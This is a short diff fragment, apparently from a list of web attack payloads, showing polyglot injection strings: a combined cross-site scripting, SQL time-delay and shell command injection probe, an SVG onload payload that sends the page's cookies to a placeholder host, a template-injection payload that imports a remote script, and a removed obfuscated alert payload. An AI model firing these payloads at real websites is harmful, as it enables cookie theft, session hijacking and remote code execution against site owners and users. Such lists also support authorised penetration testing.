@@ -48,4 +48,3 @@ sfds"><base href="https://{domain}"><script nonce='secret' src='./htmli'></scrip
 https://{domain}?'XOR/*'><svg/onload=confirm`{{10*10}}>*/(if(1=1,sleep(10),0))OR';sleep${IFS}10;#${IFS}
 '"><svg onx=() onload=(location.href='https://{domain}/'+document['cookie'])()>
 {{constructor.constructor('import("https://{domain}")')()}}
-"-alert(window['alert'](document[location=atob`https://{domain}`]))-"XYZ
